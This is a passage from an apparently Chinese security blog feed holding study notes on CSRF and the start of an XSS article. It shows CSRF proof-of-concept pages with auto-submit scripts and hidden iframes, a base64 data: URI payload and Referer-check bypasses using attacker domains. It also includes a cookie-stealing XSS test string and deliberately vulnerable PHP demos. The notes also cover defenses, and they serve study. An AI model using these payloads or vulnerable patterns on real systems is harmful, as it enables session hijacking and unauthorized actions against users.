punctuation">></span></span></code></pre><p>img标签：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span></code></pre><p>iframe标签：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span></code></pre><p>script标签：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span></code></pre><p>link标签：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></code></pre><p>通过CSS触发：</p><pre class=" language-html"><code class="language-html">*{background: url('URL?test=mi1k7ea&amp;test1=mi1k7ea&amp;Change=Change#');}当然要通过标签引入该CSS文件：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>可以发现上面有些都需要用户进行点击才能触发，如burp的和<code>&lt;a&gt;</code>标签，这是就可以用script脚本来模拟点击</p><pre class=" language-html"><code class="language-html">from表单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">var</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  m<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>a标签<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">var</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  m<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="hinden隐藏攻击过程"><a href="#hinden隐藏攻击过程" class="headerlink" title="hinden隐藏攻击过程"></a>hinden隐藏攻击过程</h3><p>其实可以发现，我们在攻击成功后，有些标签仍会停留在我们的攻击页面，而且还有些标签时分的明显，这是我们就可以用hidden属性，来隐藏属性框<br>如iframe：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf.html<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf.html<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><h3 id="XSS-CSRF"><a href="#XSS-CSRF" class="headerlink" title="XSS+CSRF"></a>XSS+CSRF</h3><p>这是常见的配合了，如果站点对CSRF漏洞设置了token机制来进行防御、但站点存在XSS漏洞可窃取CSRF token导致CSRF防御形同虚设，又如站点设置了HttpOnly限制XSS不能窃取用户cookie信息、但站点存在CSRF漏洞可被利用来进行其他的一些恶意表单操作。<br>利用两者的配合，可以让绕过一些限制，同时是的本来比较鸡肋的漏洞，变为大杀器。</p><p>再比如，如果一个XSS出现在了只能自己看到的地方，怎么办？根本没法利用，而这时候就可以和csrf进行配合。</p><p>下面列举一写案例：<br><a href="https://www.cnblogs.com/xishaonian/p/6557769.html" target="_blank" rel="noopener">一次csrf配合xss的攻击实例</a><br><a href="https://www.freebuf.com/articles/web/164069.html" target="_blank" rel="noopener">鸡肋CSRF和Self-XSS组合的变废为宝</a><br><a href="https://parrotsec-cn.org/t/topic/1423" target="_blank" rel="noopener">一次XSS+CSRF的组合拳进攻(CSRF+JSON)</a></p><h3 id="CSRF-文件上传"><a href="#CSRF-文件上传" class="headerlink" title="CSRF+文件上传"></a>CSRF+文件上传</h3><p>文件上传都是通过POST方式来上传的，而POST方式的CSRF只能通过表单的方式来发起攻击。这就存在一个问题，就是构造的表单提交的数据跟浏览器文件上传提交的数据会有所区别，即上传的请求会有一个filename的参数：</p><pre><code>-----------------------------70772515222937Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;phpinfo.php&quot;Content-Type: application/octet-stream&lt;?php    phpinfo();?&gt;-----------------------------70772515222937</code></pre><p>如果通过构造表单的方式实现文件上传，是没办法构造filename参数的，这是因为filename参数是由<code>&lt;input&gt;</code>标签自动生成的，是没办法通过表单来实现伪造的，从而能防御CSRF实现文件上传。<br>这时候CORS就能利用到了，我们可以利用它来对目标站点的上传点发起问及那上传请求，这是因为<strong>CORS虽然不允许非法的外域读取本站点的资源、但并不阻止外域向本站发起请求，而CSRF刚刚好只是发起操作请求而非读取站点资源</strong>，这就构成了CSRF+文件上传漏洞的组合拳场景。（需要注意的是，这并非CORS漏洞，而是正常的CORS请求，与上面提到的CORS跨域漏洞不同）可以利用burp生成，再加上自动提交就可以了</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">submitRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"http:\/\/www.123.com\/upload.php"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"multipart\/form-data; boundary=----WebKitFormBoundary3j90njzdr6yJb9QC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Accept"</span><span class="token punctuation">,</span> <span class="token string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Accept-Language"</span><span class="token punctuation">,</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> body <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundary3j90njzdr6yJb9QC\r\n"</span> <span class="token operator">+</span>            <span class="token string">"Content-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\r\n"</span> <span class="token operator">+</span>            <span class="token string">"Content-Type: text/plain\r\n"</span> <span class="token operator">+</span>            <span class="token string">"\r\n"</span> <span class="token operator">+</span>            <span class="token string">"test upload\n"</span> <span class="token operator">+</span>            <span class="token string">"\r\n"</span> <span class="token operator">+</span>            <span class="token string">"------WebKitFormBoundary3j90njzdr6yJb9QC--\r\n"</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> aBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> aBody<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            aBody<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>aBody<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submitRequest();<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    m<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>执行发现确实上传上去了，不过自动提交出了点问题，可能是我本地的原因，搞了半天……</p><h3 id="CSRF蠕虫"><a href="#CSRF蠕虫" class="headerlink" title="CSRF蠕虫"></a>CSRF蠕虫</h3><p>CSRF也可以形成蠕虫，如果在一个可以创建帖子的地方有csrf，就可以在提交帖子的中放出payload，就可以一直传播下去，也可以与xss配合形成蠕虫</p><p>实例：<br><a href="https://www.codercto.com/a/40828.html" target="_blank" rel="noopener">基于社交媒体的csrf蠕虫风暴探索</a><br><a href="https://www.uedbox.com/post/36858/" target="_blank" rel="noopener">新浪另类CSRF蠕虫放大危害</a><br><a href="https://bbs.ichunqiu.com/thread-21477-1-1.html" target="_blank" rel="noopener">经典的XSS+CSRF结合造成的蠕虫病毒式推广</a><br><a href="https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html" target="_blank" rel="noopener">分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</a></p><h2 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03 漏洞防御"></a>0x03 漏洞防御</h2><p>既然CSRF出在身份检验，防御当然也要从这里入手，思路就是要利用攻击者伪造不了的东西进行认证。</p><h3 id="token-验证"><a href="#token-验证" class="headerlink" title="token 验证"></a>token 验证</h3><p>使用token来代替验证码验证。由于黑客并不能拿到和看到cookie里的内容，所以无法伪造一个完整的请求。基本思路如下：</p><ol><li>服务器随机产生token（比如把cookie hash化生成），存在session中，放在cookie中或者以ajax的形式交给前端。</li><li>前端发请求的时候，解析cookie中的token，放到请求url里或者请求头中。</li><li>服务器验证token，由于黑客无法得到或者伪造token，所以能防范csrf</li></ol><p>基于这个思路，还可以延申，使token加密等等……是的即使攻击者获取到了token仍然无法使用</p><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>既然CSRF是跨域请求，我们就可以在对Referer检验，看这个来源是否合法，利用白名单进行过滤，不合法就拒绝响应</p><h3 id="在HTTP头中自定义属性并验证"><a href="#在HTTP头中自定义属性并验证" class="headerlink" title="在HTTP头中自定义属性并验证"></a>在HTTP头中自定义属性并验证</h3><p>通token一样，只不过是把token放到了HTTP自定义的属性当中</p><h2 id="0x04-Bypass"><a href="#0x04-Bypass" class="headerlink" title="0x04 Bypass"></a>0x04 Bypass</h2><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><p>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</p><h3 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h3><p>尝试更改请求方法，由于只对一种请求方法做了见到，可能就会绕过。</p><h3 id="CSRF-token的绕过"><a href="#CSRF-token的绕过" class="headerlink" title="CSRF token的绕过"></a>CSRF token的绕过</h3><h4 id="删除token参数或发送空token"><a href="#删除token参数或发送空token" class="headerlink" title="删除token参数或发送空token"></a>删除token参数或发送空token</h4><p>应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p><h4 id="使用另一个session的CSRF-token"><a href="#使用另一个session的CSRF-token" class="headerlink" title="使用另一个session的CSRF token"></a>使用另一个session的CSRF token</h4><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p><h3 id="Referer检验绕过"><a href="#Referer检验绕过" class="headerlink" title="Referer检验绕过"></a>Referer检验绕过</h3><h4 id="Referer为空"><a href="#Referer为空" class="headerlink" title="Referer为空"></a>Referer为空</h4><p>和token同理，应用程序可能只是在发送后才会验证，这种情况下，只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面，表示referrer为空</p><pre><code>&lt;meta name =“referrer”content =“no-referrer”&gt;</code></pre><p>同时可以利用其他协议来达成Referer为空</p><p>如<code>ftp://,http://,https://,file://,javascript:,data:</code>这些协议。这个时候浏览器地址栏是<code>file://</code>开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。<br>data:协议：</p><pre><code>&lt;html&gt;&lt;body&gt;&lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>利用https协议:</p><pre><code>https向http跳转的时候Referer为空,拿一个https的webshell&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;attack.php写上CSRF攻击代码</code></pre><h4 id="绕过正则表达式"><a href="#绕过正则表达式" class="headerlink" title="绕过正则表达式"></a>绕过正则表达式</h4><p>如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。</p><p>如果一个站点在referer字段检查<code>“bank.com”</code>字段，那么<code>“bank.com.attacker.com&quot;</code>或<code>”attakcer.com/bank.com&quot;</code>可能可以绕过这种检测。</p><h4 id="判断Referer是某域情况下绕过"><a href="#判断Referer是某域情况下绕过" class="headerlink" title="判断Referer是某域情况下绕过"></a>判断Referer是某域情况下绕过</h4><p>比如你找的csrf是xxx.com验证的referer是验证的*.xx.com可以找个二级域名之后&lt;img “csrf地址”&gt;之后在把文章地址发出去就可以伪造。</p><h2 id="0x05-思维导图"><a href="#0x05-思维导图" class="headerlink" title="0x05 思维导图"></a>0x05 思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200405012519.png" alt></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a><br><a href="https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/</a><br><a href="https://zhuanlan.zhihu.com/p/37293032" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/37293032</a><br><a href="https://xz.aliyun.com/t/6176" target="_blank" rel="noopener">https://xz.aliyun.com/t/6176</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习笔记</title>
      <link href="/236463394.html"/>
      <url>/236463394.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看了看面经，发现XSS和CSRF比较常问的，而目前自己对于这两周漏洞的知识很零碎，就在这周整理总结一下，分两片文章写，这篇是XSS的。XSS的话原理其实挺简单的，但更多的还是一些利用思路和绕过思路，这里总结一些比较常见的。</p><h2 id="0x01-什么是XSS？"><a href="#0x01-什么是XSS？" class="headerlink" title="0x01 什么是XSS？"></a>0x01 什么是XSS？</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1.定义"></a>1.1.定义</h3><p>跨站脚本攻击(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h3 id="1-2原理"><a href="#1-2原理" class="headerlink" title="1.2原理"></a>1.2原理</h3><p>XSS漏洞的原理，就是本来应该是个让用户传送他的数据然后展示的地方，却被恶意用户传入了恶意的信息，且此信息被解析成了程序被执行。<br>程序+数据=结果，而数据当中却被恶意用户插入了程序，导致了漏洞的产生。</p><h3 id="1-3危害"><a href="#1-3危害" class="headerlink" title="1.3危害"></a>1.3危害</h3><p>XSS的危害，常用的就是打cookie了。基于执行的JS代码能实现的操作其实很多，例如，钓鱼，恶意下载……。只要js能实现，都可以。只不过XSS能做打再多，单独的一个XSS是不能危害到服务器的。</p><h3 id="1-4分类"><a href="#1-4分类" class="headerlink" title="1.4分类"></a>1.4分类</h3><p>基本常见的就三类：</p><ul><li>反射型</li><li>存储型</li><li>DOM型（对于这个确实了解的不多……）</li></ul><h2 id="0x02-反射型XSS-和-存储型XSS"><a href="#0x02-反射型XSS-和-存储型XSS" class="headerlink" title="0x02 反射型XSS 和 存储型XSS"></a>0x02 反射型XSS 和 存储型XSS</h2><p>这两个都不难理解，就是一个存到数据库了，一个没有。</p><ul><li>反射型XSS，也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行 (经过服务器，不经过数据库)<br>反射型漏洞也不单单只存在于url当中，任何形式的数据提交都有可能。但是url中存在更容易用来进行钓鱼等……只要点开就能执行</li><li>存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器(不管是数据库、内存还是文件系统等)，然后在下次请求页面的时候就不用带上XSS代码了 (经过服务器，经过数据库)</li></ul><p>demo：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$test</span><span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>就比如这个demo，我们传入<code>url=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，这个代码就会被执行，打印出cookie，存储型就是再这个基础中间加了一个存储到数据库，从数据库中提取的过程。<br>demo：</p><pre><code>&lt;?phperror_reporting(0);$name = $_GET[&quot;name&quot;];$conn = mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;);mysql_select_db(&quot;test&quot;,$conn);mysql_query(&quot;set names &#39;utf8&#39;&quot;);$sql_insert = &quot;insert into liuyan(id,content) values(&#39;$id&#39;,&#39;$name&#39;)&quot;;$result = mysql_query($sql_insert,$conn);$sql_select = &quot;select * from liuyan&quot;;$results = mysql_fetch_array(mysql_query($sql_select));echo $results[content];?&gt;</code></pre><h2 id="0x03-Dom型XSS"><a href="#0x03-Dom型XSS" class="headerlink" title="0x03 Dom型XSS"></a>0x03 Dom型XSS</h2><p>首先的了解什么是<a href="https://www.zhihu.com/question/34219998" target="_blank" rel="noopener">Dom</a>，B乎讲的很全，<br>我的理解就是，对html按照dom树进行格式化，方便浏览器解析。Dom就是一个格式化的模型<br><img src="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/7.png" alt><br>而Dom型xss的产生则是由于对dom操作不当造成的如下面的代码，直接对name进行了输出</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>DOM XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> pos<span class="token operator">=</span>document<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"name="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">decodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span>document<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>总结一下，Dom大概就是由于再js进行dom操作的时候所造成的漏洞（基于JS），可能也存在存储类型（前端菜鸡……）。所以我认为XSS只有两类，反射型或者是存储型，又或者是DOM型or非DOM型。</p><h3 id="3-1Dom型XSS常见操作函数"><a href="#3-1Dom型XSS常见操作函数" class="headerlink" title="3.1Dom型XSS常见操作函数"></a>3.1Dom型XSS常见操作函数</h3><p>常见的输入点：</p><pre><code>document.URLdocument.URLUnencodeddocument.location（及其许多属性）document.referrerwindow.location（及其许多属性）locationlocation.hreflocation.searchlocation.hashlocation.pathname</code></pre><p>常见的输出点：</p><pre><code>// 直接执行脚本类eval(…)window.execScript(…)window.setInterval(…)window.setTimeout(…)// 写HTML页面类document.write(…)document.writeln(…)element.innerHTML(…)//直接修改DOM类document.forms[0].action=… (and various other collections)document.attachEvent(…)document.create…(…)document.execCommand(…)document.body. … (accessing the DOM through the body object)window.attachEvent(…)//替换文档URL类document.location=… (and assigning to location’s href, host and hostname)document.location.hostname=…document.location.replace(…)document.location.assign(…)document.URL=…window.navigate(…)//打开/修改窗口类document.open(…)window.open(…)window.location.href=… (and assigning to location’s href, host and hostname)</code></pre><p>以上来自<a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/</a><br>本人记录一下</p><h2 id="0x04-XSS防御"><a href="#0x04-XSS防御" class="headerlink" title="0x04 XSS防御"></a>0x04 XSS防御</h2><p>这个就贼复杂了……大概总结一下<br>先说一下目前的一些防御机制：</p><ol><li><strong>HttpOnly</strong>（如果再cookie当中设置这个属性，js脚本将无法读取到cookie信息）</li><li><strong>浏览器内置XSS过滤器</strong></li><li><strong>Web 安全头支持</strong>：<ol><li><strong>CSP</strong>：W3C 的 Content Security Policy，简称 CSP，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP。" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP。</a></li><li><strong>X-Download-Options: noopen</strong>：默认开启，禁用 IE 下下载框 Open 按钮，防止 IE 下下载文件默认被打开 XSS。</li><li><strong>X-Content-Type-Options: nosniff</strong>：禁用 IE8 自动嗅探 mime 功能例如 text/plain 却当成 text/html 渲染，特别当本站点 server 的内容未必可信的时候。</li><li><strong>X-XSS-Protection</strong>：IE 提供的一些 